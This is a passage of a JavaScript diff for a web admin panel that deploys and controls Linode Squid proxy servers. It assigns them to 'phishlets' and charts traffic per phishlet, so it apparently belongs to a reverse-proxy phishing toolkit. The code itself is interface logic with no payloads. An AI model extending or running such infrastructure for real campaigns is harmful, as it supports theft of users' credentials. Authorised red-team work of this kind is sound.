+  let h='';
+  order.forEach(g=>{
+    const list=groups[g]||[];
+    if(!list.length)return;
+    h+='<div class="px-dd-group"><div class="px-dd-group-title">'+esc(g)+'</div>';
+    list.forEach(r=>{
+      h+='<button type="button" class="px-dd-item" onclick="pxAddRegion(\''+esc(r.id)+'\')">'+pxFlag(r.country)+'<span>'+pxRegionLine(r)+'</span></button>';
+    });
+    h+='</div>';
+  });
+  if(!h){
+    h='<div class="px-dd-empty">'+(q?'No regions match \"'+esc(q)+'\"':'No more regions available')+'</div>';
+  }
+  menu.innerHTML=h;
+}
+function pxFocusRegionSearch(){
+  const inp=$('#pxRegionSearch');
+  if(inp)inp.focus();
+  pxOpenRegions(true);
+}
+function pxToggleRegions(){
+  const dd=$('#pxRegionDd');
+  if(dd && dd.classList.contains('open')){pxCloseRegions();return}
+  pxOpenRegions(true);
+}
+function pxFilterRegions(){
+  _pxRegionQ=($('#pxRegionSearch')&&$('#pxRegionSearch').value)||'';
+  const dd=$('#pxRegionDd');
+  if(!dd||!dd.classList.contains('open')) pxOpenRegions(true);
+  else _paintRegionMenu();
+}
+async function pxOpenRegions(keep){
+  const dd=$('#pxRegionDd');
+  if(!dd)return;
+  const isOpen=dd.classList.contains('open');
+  if(isOpen && !keep){pxCloseRegions();return}
+  dd.classList.add('open');
+  const menu=$('#pxRegionMenu');
+  const inp=$('#pxRegionSearch');
+  if(inp) setTimeout(function(){inp.focus()},0);
+  if(!_pxRegions.length){
+    if(menu)menu.innerHTML='<div class="px-dd-empty">Refreshing from Linode…</div>';
+    try{
+      const rr=await api('/api/proxy/regions');
+      if(rr && rr.error)throw new Error(rr.error);
+      _pxRegions=Array.isArray(rr)?rr:[];
+    }catch(e){
+      if(menu)menu.innerHTML='<div class="px-dd-empty">Failed to load regions</div>';
+      toast('Regions refresh failed','err');
+      return;
+    }
+  }
+  _paintRegionMenu();
+  _renderRegionChips();
+}
+function pxCloseRegions(){const dd=$('#pxRegionDd');if(dd)dd.classList.remove('open')}
+function pxAddRegion(id){
+  if(!id)return;
+  const c=parseInt($('#pxCount').value)||1;
+  if(_pxSel.has(id)){pxCloseRegions();return}
+  if(_pxSel.size>=c){toast('Max '+c+' regions for '+c+' servers','err');return}
+  _pxSel.add(id);
+  _pxRegionQ='';
+  const inp=$('#pxRegionSearch');
+  if(inp)inp.value='';
+  _renderRegionChips();
+  if(_pxSel.size>=c) pxCloseRegions();
+  else{_paintRegionMenu();if(inp)inp.focus()}
+}
+function pxRemoveRegion(id){_pxSel.delete(id);_renderRegionChips();if($('#pxRegionDd')&&$('#pxRegionDd').classList.contains('open'))_paintRegionMenu()}
+document.addEventListener('click',e=>{
+  const dd=$('#pxRegionDd');
+  if(dd && dd.classList.contains('open') && !dd.contains(e.target)) pxCloseRegions();
+});
+(function(){
+  const inp=$('#pxRegionSearch');
+  if(!inp)return;
+  inp.addEventListener('focus',function(){pxOpenRegions(true)});
+  inp.addEventListener('input',pxFilterRegions);
+  inp.addEventListener('keydown',function(e){
+    if(e.key==='Escape'){pxCloseRegions();inp.blur();return}
+    if(e.key==='Enter'){
+      e.preventDefault();
+      const first=document.querySelector('#pxRegionMenu .px-dd-item');
+      if(first) first.click();
+    }
+  });
+})();
+$('#pxCount')&&$('#pxCount').addEventListener('input',()=>{
+  const c=parseInt($('#pxCount').value)||1;
+  if(_pxSel.size>c){const keep=[..._pxSel].slice(0,c);_pxSel=new Set(keep)}
+  _renderRegionChips();
+});
+async function pxDeploy(){
+  const count=parseInt($('#pxCount').value)||0;
+  if(count<1)return toast('At least 1 server','err');
+  const regions=[..._pxSel];
+  if(!regions.length)return toast('Select at least one region','err');
+  if(regions.length>count)return toast('Cannot pick more regions than servers','err');
+  btnBusy($('#pxDeployBtn'),true,'Deploying…');
+  try{
+    const r=await api('/api/proxy/deploy',{method:'POST',body:JSON.stringify({count,regions})});
+    if(r.error){btnBusy($('#pxDeployBtn'),false);return toast(r.error,'err')}
+    toast('Deploying '+count+' server(s)…');
+    _pxShowSkel(count);
+    _startDeployPoll();
+  }catch(e){btnBusy($('#pxDeployBtn'),false)}
+}
+function _startDeployPoll(){
+  $('#pxDeployProgress').style.display='';
+  $('#pxDeployBtn').disabled=true;
+  clearInterval(_pxPollId);
+  _pxPollId=setInterval(async()=>{
+    const st=await api('/api/proxy/state');
+    const d=st.deploy||{};
+    $('#pxBar').style.width=(d.pct||0)+'%';
+    $('#pxStep').textContent=(d.step||'')+(d.error?' — '+d.error:'');
+    _renderProxyGrid(st);
+    _renderAssign(st);
+    _renderPxTraffic(st);
+    if(!d.running){clearInterval(_pxPollId);btnBusy($('#pxDeployBtn'),false);if(d.pct>=100)setTimeout(()=>{if($('#pxDeployProgress'))$('#pxDeployProgress').style.display='none'},4000)}
+  },2000);
+}
+function _pxMergeState(st, light){
+  const prev={};
+  ((_pxLastSt&&_pxLastSt.proxies)||[]).forEach(p=>{prev[p.id]=p;prev[String(p.id)]=p});
+  st.proxies=(st.proxies||[]).map(p=>{
+    const old=prev[p.id]||prev[String(p.id)];
+    if(!old) return p;
+    const out=Object.assign({}, old, p);
+    const trans=!!_pxPowerJobs[p.id] || ['booting','rebooting','shutting_down'].indexOf((p.linode_status||old.linode_status||'').toLowerCase())>=0;
+    const keep=light || trans;
+    if(keep){
+      if(typeof p.cpu!=='number') out.cpu=old.cpu;
+      else if(trans && p.cpu===0 && typeof old.cpu==='number') out.cpu=old.cpu;
+      if(typeof p.net_in!=='number') out.net_in=old.net_in;
+      else if(trans && !p.net_in && old.net_in) out.net_in=old.net_in;
+      if(typeof p.net_out!=='number') out.net_out=old.net_out;
+      else if(trans && !p.net_out && old.net_out) out.net_out=old.net_out;
+      if(!p.region && old.region) out.region=old.region;
+      if(!p.ipv4 && old.ipv4) out.ipv4=old.ipv4;
+      if(!p.endpoint && old.endpoint) out.endpoint=old.endpoint;
+    }
+    const mergedUsed=Object.assign({}, old.used_by||{});
+    Object.keys(p.used_by||{}).forEach(k=>{
+      const nu=(p.used_by||{})[k]||{}, ou=mergedUsed[k]||{};
+      mergedUsed[k]={
+        hits:Math.max(Number(nu.hits||0), Number(ou.hits||0)),
+        bytes_out:Math.max(Number(nu.bytes_out||0), Number(ou.bytes_out||0)),
+        bytes_in:Math.max(Number(nu.bytes_in||0), Number(ou.bytes_in||0)),
+        last:Math.max(Number(nu.last||0), Number(ou.last||0))
+      };
+    });
+    out.used_by=mergedUsed;
+    return out;
+  });
+  const rev={};
+  Object.keys(st.assignments||{}).forEach(pl=>{
+    (st.assignments[pl]||[]).forEach(id=>{
+      const k=String(id);
+      (rev[k]=rev[k]||[]).push(pl);
+    });
+  });
+  (st.proxies||[]).forEach(p=>{
+    p.assigned_phishlets=[...new Set(rev[String(p.id)]||[])];
+  });
+  _pxLastSt=st;
+  return st;
+}
+async function _pxRefreshState(light){
+  try{
+    const raw=await api('/api/proxy/state?_='+Date.now()+(light?'&light=1':''));
+    const st=_pxMergeState(raw, !!light);
+    _pxAdvancePower(st);
+    _renderProxyGrid(st);
+    if(!light){
+      _renderAssign(st);
+      _renderPxTraffic(st);
+    }
+    if((st.deploy||{}).running)_startDeployPoll();
+  }catch(e){}
+}
+function _pxPowerBusy(p){
+  const ls=(p.linode_status||'').toLowerCase();
+  const ps=(p.status||'').toLowerCase();
+  return ['booting','rebooting','shutting_down','provisioning'].indexOf(ls)>=0 || ['booting','rebooting'].indexOf(ps)>=0 || !!_pxPowerJobs[p.id];
+}
+function _pxIsRunning(p){
+  const ls=(p.linode_status||'').toLowerCase();
+  if(ls==='running') return true;
+  if(ls==='offline'||ls==='stopped'||ls==='shutting_down') return false;
+  return (p.status||'')==='active' && !['booting','rebooting','stopped'].includes(p.status);
+}
+function _pxIsStopped(p){
+  const ls=(p.linode_status||'').toLowerCase();
+  return ls==='offline'||ls==='stopped'||(p.status||'')==='stopped';
+}
+function _pxPowerLabel(job,ls){
+  if(!job) return ls||'working';
+  if(job.action==='start') return ls==='booting'?'Booting':(ls==='running'?'Started':'Starting');
+  if(job.action==='stop') return ls==='shutting_down'?'Shutting down':(ls==='offline'||ls==='stopped'?'Stopped':'Stopping');
+  if(job.action==='restart') return (ls==='rebooting'||ls==='booting')?'Rebooting':(ls==='running'&&job.sawTrans?'Restarted':'Restarting');
+  return job.action;
+}
+function _pxPowerPct(p,job){
+  const ls=(p.linode_status||'').toLowerCase();
+  const age=Date.now()-(job.t0||0);
+  if(job.action==='start'){
+    if(ls==='running' && age>2500) return 100;
+    if(ls==='booting') return Math.min(88, 42+age/400);
+    if(ls==='offline'||ls==='stopped') return Math.min(18, 8+age/800);
+    return Math.min(30, 12+age/900);
+  }
+  if(job.action==='stop'){
+    if(ls==='offline'||ls==='stopped') return 100;
+    if(ls==='shutting_down') return Math.min(88, 40+age/350);
+    if(ls==='running') return Math.min(28, 8+age/600);
+    return Math.min(40, 16+age/800);
+  }
+  if(job.action==='restart'){
+    if(['rebooting','booting','shutting_down'].indexOf(ls)>=0){job.sawTrans=true;return Math.min(82, 48+age/500)}
+    if(ls==='running' && job.sawTrans && age>4000) return 100;
+    if(ls==='running') return Math.min(22, 10+age/700);
+    return Math.min(35, 14+age/800);
+  }
+  return 0;
+}
+function _pxAdvancePower(st){
+  const live=new Set((st.proxies||[]).map(p=>String(p.id)));
+  Object.keys(_pxPowerJobs).forEach(id=>{if(!live.has(String(id))) delete _pxPowerJobs[id]});
+  (st.proxies||[]).forEach(p=>{
+    const job=_pxPowerJobs[p.id];
+    if(!job) return;
+    const pct=Math.round(_pxPowerPct(p,job));
+    job.pct=Math.max(job.pct||8, pct);
+    if(job.pct>=100){
+      job.pct=100;
+      if(!job.doneAt) job.doneAt=Date.now();
+      if(Date.now()-job.doneAt>1600) delete _pxPowerJobs[p.id];
+    }
+  });
+}
+function _startPowerPoll(){
+  if(_pxPowerPollId) return;
+  _pxPowerPollId=setInterval(async()=>{
+    await _pxRefreshState(true);
+    if(!Object.keys(_pxPowerJobs).length){clearInterval(_pxPowerPollId);_pxPowerPollId=null;_pxRefreshState()}
+  },1500);
+}
+function _fmtBits(b){if(!b||b<0)return'0 b/s';if(b>1e9)return(b/1e9).toFixed(1)+' Gb/s';if(b>1e6)return(b/1e6).toFixed(1)+' Mb/s';if(b>1e3)return(b/1e3).toFixed(1)+' Kb/s';return Math.round(b)+' b/s'}
+function _fmtBytes(n){n=Math.max(0,Number(n)||0);if(n<1024)return Math.round(n)+' B';if(n<1048576)return(n/1024).toFixed(1)+' KB';if(n<1073741824)return(n/1048576).toFixed(1)+' MB';return(n/1073741824).toFixed(2)+' GB'}
+const PX_PAL=['#00ff88','#22d3ee','#a78bfa','#f59e0b','#facc15','#38bdf8','#fb7185','#34d399'];
+function _pxColor(i){return PX_PAL[i%PX_PAL.length]}
+function _pxUsed(p,name){return (p.used_by&&p.used_by[name])||{}}
+function _pxAssignedNames(p){return [...new Set(p.assigned_phishlets||[])].sort()}
+function _pxIsAssigned(p,name){return (p.assigned_phishlets||[]).indexOf(name)>=0}
+function _pxStat(p,name){
+  const u=_pxUsed(p,name);
+  return {bytes_out:Number(u.bytes_out||0),bytes_in:Number(u.bytes_in||0),hits:Number(u.hits||0)};
+}
+function _pxTrafficNames(p){
+  const names=new Set();
+  Object.keys(p.used_by||{}).forEach(n=>{
+    const u=_pxStat(p,n);
+    if(u.bytes_out||u.bytes_in||u.hits) names.add(n);
+  });
+  return [...names].sort();
+}
+function _pxPhishletsHtml(p){
+  const names=_pxAssignedNames(p);
+  if(!names.length)return '<div class="px-ph-list"><div class="k">Assigned Phishlets</div><div class="px-ph-empty">None assigned</div></div>';
+  let tags='';
+  names.forEach(n=>{
+    const hits=_pxStat(p,n).hits;
+    tags+='<span class="px-ph-tag">'+esc(n)+(hits?'<span class="n">'+hits+'</span>':'')+'</span>';
+  });
+  return '<div class="px-ph-list"><div class="k">Assigned Phishlets</div><div class="px-ph-tags">'+tags+'</div></div>';
+}
+function _pxTrafficOutHtml(p){
+  const names=_pxTrafficNames(p);
+  if(!names.length)return '<div class="px-ph-list"><div class="k">Traffic Out</div><div class="px-ph-empty">No traffic yet</div></div>';
+  const total=names.reduce((s,n)=>s+_pxStat(p,n).bytes_out,0)||names.reduce((s,n)=>s+_pxStat(p,n).hits,0);
+  let rows='';
+  names.forEach(n=>{
+    const st=_pxStat(p,n);
+    const part=st.bytes_out||st.hits;
+    const pct=total?Math.max(4,Math.round(part/total*100)):0;
+    rows+='<div class="px-tr-row"><div class="px-tr-top"><b>'+esc(n)+'</b><span class="v">'+_fmtBytes(st.bytes_out)+(st.hits?' · '+st.hits+' req':'')+'</span></div><div class="px-tr-bar"><i style="width:'+(total?pct:0)+'%"></i></div></div>';
+  });
+  return '<div class="px-ph-list"><div class="k">Traffic Out</div>'+rows+'</div>';
+}
+function _pxTrafficMatrix(st){
+  const proxies=st.proxies||[];
+  const phSet=new Set();
+  proxies.forEach(p=>_pxTrafficNames(p).forEach(n=>phSet.add(n)));
+  const phishlets=[...phSet].sort();
+  let totalBytes=0,totalHits=0;
+  const rows=[];
+  proxies.forEach(p=>{
+    _pxTrafficNames(p).forEach(n=>{
+      const u=_pxStat(p,n);
+      totalBytes+=u.bytes_out; totalHits+=u.hits;
+      rows.push({ph:n, proxy:p.label||('proxy-'+p.id), ip:p.ipv4||'—', id:p.id, bytes_out:u.bytes_out, bytes_in:u.bytes_in, hits:u.hits});
+    });
+  });
+  return {proxies, phishlets, rows, totalBytes, totalHits, useBytes:totalBytes>0};
+}
+function _pxIpLab(p){return (p.ipv4||p.label||('px-'+p.id))}
+function _renderPxTraffic(st){
+  const card=$('#pxTrafficCard');
+  if(!card)return;
+  const proxies=st.proxies||[];
+  if(!proxies.length){card.style.display='none';return}
+  card.style.display='';
+  const mx=_pxTrafficMatrix(st);
+  const hint=$('#pxChartHint');
+  const mode=mx.useBytes?'bytes':'hits';
+  if(hint)hint.textContent=mx.useBytes
+    ?'Cumulative outbound bytes through each proxy, split by phishlet — history is kept after detach'
+    :'Request count per proxy / phishlet — history is kept after detach';
+  const charge=!!_pxChartCharge;
+  _pxChartCharge=false;
+  const key=mode==='bytes'?'bytes_out':'hits';
+  const totals=mx.proxies.map(p=>mx.phishlets.reduce((s,n)=>s+_pxStat(p,n)[key],0));
+  const max=Math.max(1,...totals);
+  const legend=$('#pxBarLegend');
+  if(legend)legend.innerHTML=mx.phishlets.map((n,i)=>'<span class="px-bar-leg"><i style="background:'+_pxColor(i)+';color:'+_pxColor(i)+'"></i>'+esc(n)+'</span>').join('')||'';
+  const bars=$('#pxChartBars');
+  if(bars){
+    let h='';
+    mx.proxies.forEach((p,pi)=>{
+      const sum=totals[pi]||0;
+      const pct=Math.max(sum?8:0, sum/max*100);
+      const parts=mx.phishlets.map((n,i)=>({n,i,v:_pxStat(p,n)[key]})).filter(x=>x.v>0);
+      const lab=_pxIpLab(p);
+      h+='<div class="px-bar-row"><div class="px-bar-lab" title="'+esc(lab)+(p.label?' · '+esc(p.label):'')+'">'+esc(lab)+'</div>';
+      h+='<div class="px-bar-track"><div class="px-bar-fill'+(charge?' charge':'')+'" style="width:'+pct+'%">';
+      if(parts.length){
+        parts.forEach(x=>{
+          h+='<i class="px-bar-seg" title="'+esc(x.n)+'" style="width:'+(x.v/sum*100)+'%;background:linear-gradient(90deg,'+_pxColor(x.i)+','+_pxColor(x.i)+'99)"></i>';
+        });
+      }
+      h+='</div></div><div class="px-bar-val">'+(mode==='bytes'?_fmtBytes(sum):sum+' req')+'</div></div>';
+    });
+    bars.innerHTML=h||'<div class="px-traf-empty">No assigned traffic</div>';
+  }
+  const donutLabels=mx.phishlets.length?mx.phishlets:['No data'];
+  const donutData=mx.phishlets.length
+    ?mx.phishlets.map(n=>mx.proxies.reduce((s,p)=>s+_pxStat(p,n)[key],0))
+    :[1];
+  const donutTotal=mx.phishlets.length?donutData.reduce((a,b)=>a+b,0):0;
+  const dv=$('#pxDonutVal'), ds=$('#pxDonutSub');
+  if(dv)dv.textContent=mx.phishlets.length?(mode==='bytes'?_fmtBytes(donutTotal):donutTotal+' req'):'—';
+  if(ds)ds.textContent=mode==='bytes'?'total out':'requests';
+  const donutCfg={
+    type:'doughnut',
+    data:{labels:donutLabels,datasets:[{data:donutData,backgroundColor:donutLabels.map((_,i)=>mx.phishlets.length?_pxColor(i)+'dd':'#47556999'),borderColor:'#0a0e17',borderWidth:3,hoverOffset:10,borderRadius:mx.phishlets.length>1?8:0,spacing:mx.phishlets.length>1?2:0}]},
+    options:{responsive:true,maintainAspectRatio:false,cutout:'74%',
+      animation:charge?{duration:1100,easing:'easeOutQuart',animateRotate:true,animateScale:true}:false,
+      plugins:{legend:{display:true,position:'bottom',labels:{color:'#e2e8f0',font:{family:'Inter',size:11},usePointStyle:true,pointStyle:'circle',padding:14}},
+        tooltip:{backgroundColor:'rgba(10,14,23,0.95)',borderColor:'rgba(0,255,136,0.25)',borderWidth:1,titleColor:'#f1f5f9',bodyColor:'#e2e8f0',
+          callbacks:{label:function(c){const sum=donutData.reduce((a,b)=>a+b,0)||1;const pct=((c.raw/sum)*100).toFixed(1);return ' '+c.label+': '+(mode==='bytes'?_fmtBytes(c.raw):c.raw+' req')+' ('+pct+'%)'}}}}
+    },
+    plugins:[{id:'pxGlow',beforeDatasetDraw(chart){const ctx=chart.ctx;ctx.save();ctx.shadowColor='rgba(0,255,136,0.45)';ctx.shadowBlur=22},afterDatasetDraw(chart){chart.ctx.restore()}}]
+  };
+  const donEl=$('#pxChartDonut');
+  if(donEl){
+    if(_pxChartDonut && _pxChartMode===mode && !charge){_pxChartDonut.data=donutCfg.data;_pxChartDonut.update('none')}
+    else{if(_pxChartDonut)_pxChartDonut.destroy();_pxChartDonut=new Chart(donEl,donutCfg)}
+  }
+  _pxChartMode=mode;
+  const box=$('#pxTrafficTable');
+  if(!box)return;
+  const visible=mx.rows.slice();
+  if(!visible.length){
+    box.innerHTML='<div class="px-traf-empty">No traffic recorded yet. Bytes appear here per phishlet and proxy, including after detach.</div>';
+    return;
+  }
+  visible.sort((a,b)=>(b.bytes_out-a.bytes_out)||(b.hits-a.hits));
+  let h='<div class="px-traf-table-wrap"><table><thead><tr><th>Phishlet</th><th>Proxy</th><th>IP</th><th>Traffic Out</th><th>Traffic In</th><th>Requests</th></tr></thead><tbody>';
+  visible.forEach(r=>{
+    h+='<tr><td><strong style="color:var(--cyan)">'+esc(r.ph)+'</strong></td><td style="font-family:var(--mono)">'+esc(r.proxy)+'</td><td style="font-family:var(--mono)">'+esc(r.ip)+'</td><td style="color:var(--accent);font-family:var(--mono)">'+_fmtBytes(r.bytes_out)+'</td><td style="font-family:var(--mono)">'+_fmtBytes(r.bytes_in)+'</td><td style="font-family:var(--mono)">'+r.hits+'</td></tr>';
+  });
+  h+='</tbody></table></div>';
+  box.innerHTML=h;
+}
+function _renderProxyGrid(st){
+  const proxies=st.proxies||[];
+  if(!proxies.length){$('#pxGrid').innerHTML='<div class="empty"><i class="fa-solid fa-server"></i><p>No proxy instances deployed yet</p></div>';return}
+  const liveIds=new Set(proxies.map(p=>p.id));
+  [..._pxSeen].forEach(id=>{if(!liveIds.has(id))_pxSeen.delete(id)});
+  let h='';proxies.forEach((p,idx)=>{
+    const badge=p.status||'unknown';
+    const cpu=typeof p.cpu==='number'?p.cpu.toFixed(1)+'%':'—';
+    const fresh=!_pxSeen.has(p.id);
+    _pxSeen.add(p.id);
+    const reg=pxRegionMeta(p.region);
+    h+='<div class="px-tile'+(fresh?' px-in':'')+'" style="animation-delay:'+(fresh?Math.min(idx,6)*0.06:0)+'s">';
+    h+='<div class="px-tile-head"><span class="px-tile-label">'+esc(p.label||'proxy-'+p.id)+'</span><span class="px-badge '+esc(badge)+'">'+esc(badge)+'</span></div>';
+    h+='<div class="px-tile-row"><span>IP</span><span class="v">'+esc(p.ipv4||'pending')+'</span></div>';
+    h+='<div class="px-tile-row"><span>Region</span><span class="v" style="display:flex;align-items:center;gap:6px">'+pxFlag(reg.country||'')+esc(reg.city||p.region||'—')+'</span></div>';
+    h+='<div class="px-tile-row"><span>Endpoint</span><span class="v">'+esc(p.endpoint||'—')+'</span></div>';
+    h+='<div class="px-tile-row"><span>Linode</span><span class="v">'+esc(p.linode_status||'—')+'</span></div>';
+    h+='<div class="px-tile-row"><span>CPU</span><span class="v">'+cpu+'</span></div>';
+    h+='<div class="px-tile-row"><span>Traffic In</span><span class="v">'+_fmtBits(p.net_in)+'</span></div>';
+    h+='<div class="px-tile-row"><span>Traffic Out</span><span class="v">'+_fmtBits(p.net_out)+'</span></div>';
+    if(p.metrics_error)h+='<div class="px-tile-row"><span>Metrics</span><span class="v" style="color:var(--orange)">'+esc(p.metrics_error)+'</span></div>';
+    h+=_pxPhishletsHtml(p);
+    h+=_pxTrafficOutHtml(p);
+    const job=_pxPowerJobs[p.id];
+    const ls=(p.linode_status||'').toLowerCase();
+    const busy=_pxPowerBusy(p);
+    const running=_pxIsRunning(p);
+    const stopped=_pxIsStopped(p);
+    const startOff=busy||running;
+    const stopOff=busy||stopped;
+    const restartOff=busy||stopped;
+    if(job){
+      const pct=Math.max(8, Math.min(100, job.pct||8));
+      h+='<div class="px-pwr"><div class="px-pwr-lab"><i class="fa-solid fa-spinner fa-spin"></i> '+esc(_pxPowerLabel(job,ls))+'<span>'+pct+'%</span></div><div class="px-pwr-track"><i class="px-pwr-fill" data-pwr="'+p.id+'" style="width:'+pct+'%"></i></div></div>';
+    }
+    h+='<div class="px-tile-actions">';
+    if(badge==='failed')h+='<button class="btn sm cyan" onclick="pxRepair('+p.id+',\''+esc(p.label||'')+'\')"><i class="fa-solid fa-wrench"></i> Repair</button>';
+    h+='<button class="btn sm danger" onclick="pxDestroy('+p.id+',\''+esc(p.label||'')+'\')"><i class="fa-solid fa-trash-can"></i> Destroy</button>';
+    h+='<button class="btn sm px-pwr-btn'+(startOff?' dim':'')+'" '+(startOff?'disabled':'')+' onclick="pxPower('+p.id+',\'start\',\''+esc(p.label||'')+'\')"><i class="fa-solid fa-play"></i> Start</button>';
+    h+='<button class="btn sm px-pwr-btn'+(stopOff?' dim':'')+'" '+(stopOff?'disabled':'')+' onclick="pxPower('+p.id+',\'stop\',\''+esc(p.label||'')+'\')"><i class="fa-solid fa-stop"></i> Stop</button>';
+    h+='<button class="btn sm px-pwr-btn'+(restartOff?' dim':'')+'" '+(restartOff?'disabled':'')+' onclick="pxPower('+p.id+',\'restart\',\''+esc(p.label||'')+'\')"><i class="fa-solid fa-rotate"></i> Restart</button>';
+    h+='</div></div>';
+  });
+  $('#pxGrid').innerHTML=h;
+}
+function pxDestroy(id,label){openModal('DESTROY PROXY','<p style="color:#fff;margin-bottom:12px">Permanently delete <strong style="color:var(--red)">'+esc(label||'proxy-'+id)+'</strong>?</p><p style="color:var(--text3);font-size:13px">This will terminate the Linode instance. The action cannot be undone.</p>','<button class="btn danger" onclick="doPxDestroy('+id+')"><i class="fa-solid fa-trash-can"></i> DESTROY</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function doPxDestroy(id){await withBusy(typeof event!=='undefined'?event:null,'Destroying…',async()=>{const r=await api('/api/proxy/destroy',{method:'POST',body:JSON.stringify({id})});closeModal();if(r.error)toast(r.error,'err');else{toast('Proxy destroyed');_pxRefreshState()}})}
+function pxPower(id,action,label){
+  const titles={start:'START PROXY',stop:'STOP PROXY',restart:'RESTART PROXY'};
+  const verbs={start:'Boot',stop:'Shut down',restart:'Reboot'};
+  const notes={start:'The Linode will boot. Squid stays installed.',stop:'Traffic will skip this node until you press Start. The instance is kept.',restart:'The Linode will reboot. Assignments are kept.'};
+  openModal(titles[action]||'PROXY POWER','<p style="color:#fff;margin-bottom:12px">'+verbs[action]+' <strong style="color:var(--accent)">'+esc(label||'proxy-'+id)+'</strong>?</p><p style="color:var(--text3);font-size:13px">'+notes[action]+'</p>','<button class="btn fill" onclick="doPxPower('+id+',\''+action+'\')"><i class="fa-solid fa-'+(action==='start'?'play':action==='stop'?'stop':'rotate')+'"></i> '+action.toUpperCase()+'</button><button class="btn" onclick="closeModal()">CANCEL</button>');
+}
+async function doPxPower(id,action){await withBusy(typeof event!=='undefined'?event:null,action+'…',async()=>{const r=await api('/api/proxy/power',{method:'POST',body:JSON.stringify({id,action})});closeModal();if(r.error)toast(r.error,'err');else{_pxPowerJobs[id]={action:action,t0:Date.now(),sawTrans:false,pct:8};toast('Proxy '+action+' sent');_startPowerPoll();_pxRefreshState(true)}})}
+function pxRepair(id,label){openModal('REPAIR PROXY','<p style="color:#fff;margin-bottom:12px">Install Squid on <strong style="color:var(--cyan)">'+esc(label||'proxy-'+id)+'</strong>?</p><p style="color:var(--text3);font-size:13px">The Linode is kept. If SSH is locked it will power-cycle once to reset access, then install the proxy.</p>','<button class="btn fill" onclick="doPxRepair('+id+')"><i class="fa-solid fa-wrench"></i> REPAIR</button><button class="btn" onclick="closeModal()">CANCEL</button>')}
+async function doPxRepair(id){await withBusy(typeof event!=='undefined'?event:null,'Repairing…',async()=>{const r=await api('/api/proxy/repair',{method:'POST',body:JSON.stringify({id})});closeModal();if(r.error)toast(r.error,'err');else{toast('Repair started');_startDeployPoll();_pxRefreshState()}})}
+function _pxCheckedIds(){return [...document.querySelectorAll('#pxAssignChecks input:checked')].map(c=>parseInt(c.value))}
+function _renderAssign(st){
+  _pxAssignSt=st;
+  const proxies=(st.proxies||[]).filter(p=>p.ready||p.status==='active');
+  const assign=st.assignments||{};
+  const current=st.current||{};
+  let ph=$('#pxAssignPh');
+  const prev=ph.value;
+  let opts='<option value="">— select phishlet —</option>';
+  allPhishlets.forEach(p=>{opts+='<option value="'+esc(p.name)+'">'+esc(p.name)+'</option>'});
+  ph.innerHTML=opts;
+  if(prev)ph.value=prev;
+  const selPh=ph.value;
+  const assigned=selPh?(assign[selPh]||[]):[];
+  let ch='';proxies.forEach(p=>{
+    const checked=assigned.includes(p.id)?'checked':'';
+    ch+='<label class="px-assign-check"><input type="checkbox" value="'+p.id+'" '+checked+'> '+esc(p.ipv4||p.label||'proxy-'+p.id)+'</label>';
+  });
+  $('#pxAssignChecks').innerHTML=ch||'<span style="color:var(--text3);font-size:13px">No active proxies</span>';
+  let ca='<h4>Current Assignments</h4>';
+  const keys=Object.keys(assign).filter(k=>(assign[k]||[]).length>0);
+  if(!keys.length)ca+='<div style="color:var(--text3);font-size:13px">No assignments yet</div>';
+  keys.forEach(k=>{
+    const ids=assign[k];
+    const cur=current[k];
+    const chips=ids.map(i=>{
+      const p=(st.proxies||[]).find(x=>x.id===i);
+      const ip=(p?p.ipv4:i)||i;
+      return '<span class="px-ip-chip'+(i===cur?' on':'')+'">'+esc(String(ip))+(i===cur?' ●':'')+'<button title="Detach" onclick="pxDetachOne(\''+esc(k)+'\','+i+')">&times;</button></span>';
+    }).join('');
+    ca+='<div class="row"><b>'+esc(k)+'</b><span>'+chips+'</span></div>';
+  });
+  $('#pxCurAssign').innerHTML=ca;
+}
+$('#pxAssignPh')&&$('#pxAssignPh').addEventListener('change',()=>_pxRefreshState());
+function _pxSetBusy(on, which){
+  const a=$('#pxAssignBtn'), d=$('#pxDetachBtn');
+  if(a){
+    a.disabled=!!on;
+    a.innerHTML=on&&which==='assign'
+      ?'<i class="fa-solid fa-spinner fa-spin"></i> Assigning…'
+      :'<i class="fa-solid fa-check"></i> Assign';
+  }
+  if(d){
+    d.disabled=!!on;
+    d.innerHTML=on&&which==='detach'
+      ?'<i class="fa-solid fa-spinner fa-spin"></i> Detaching…'
+      :'<i class="fa-solid fa-link-slash"></i> Detach';
+  }
+}
+async function pxAssign(){
+  const ph=$('#pxAssignPh').value;
+  if(!ph)return toast('Select a phishlet','err');
+  const ids=_pxCheckedIds();
+  _pxSetBusy(true,'assign');
+  try{
+    const r=await api('/api/proxy/assign',{method:'POST',body:JSON.stringify({phishlet:ph,ids})});
+    if(r.error)toast(r.error,'err');else{toast(ph+' → '+ids.length+' proxy(ies)');await _pxRefreshState()}
+  }finally{_pxSetBusy(false)}
+}
+async function pxDetach(){
+  const ph=$('#pxAssignPh').value;
+  if(!ph)return toast('Select a phishlet','err');
+  const ids=_pxCheckedIds();
+  if(!ids.length)return toast('Select proxies to detach','err');
+  _pxSetBusy(true,'detach');
+  try{
+    const r=await api('/api/proxy/detach',{method:'POST',body:JSON.stringify({phishlet:ph,ids})});
+    if(r.error)toast(r.error,'err');else{toast(ph+' detached '+ids.length+' proxy(ies)');await _pxRefreshState()}
+  }finally{_pxSetBusy(false)}
+}
+async function pxDetachOne(ph,id){
+  await withBusy(typeof event!=='undefined'?event:null,'Detaching…',async()=>{
+    const r=await api('/api/proxy/detach',{method:'POST',body:JSON.stringify({phishlet:ph,ids:[id]})});
+    if(r.error)toast(r.error,'err');else{toast(ph+' detached');_pxRefreshState()}
+  });
+}
+
+/* ═══ Notification Centre ═══ */
+let _ncItems=[];
+function toggleNcPanel(){const p=$('#ncPanel');const o=$('#ncOverlay');if(p.classList.contains('open')){closeNcPanel()}else{p.classList.add('open');o.classList.add('open');loadNcItems()}}
+function closeNcPanel(){$('#ncPanel').classList.remove('open');$('#ncOverlay').classList.remove('open')}
+function _ncTimeAgo(epoch){if(!epoch)return'';const diff=Math.floor(Date.now()/1000)-epoch;if(diff<60)return'just now';if(diff<3600)return Math.floor(diff/60)+'m ago';if(diff<86400)return Math.floor(diff/3600)+'h ago';return Math.floor(diff/86400)+'d ago'}
+async function loadNcItems(){
+  try{
+    const r=await api('/api/nc');
+    _ncItems=r.items||[];
+    const unread=r.unread||0;
+    const badge=$('#ncBadge');
+    if(unread>0){badge.textContent=unread>99?'99+':unread;badge.style.display='flex'}else{badge.style.display='none'}
+    const list=$('#ncList');
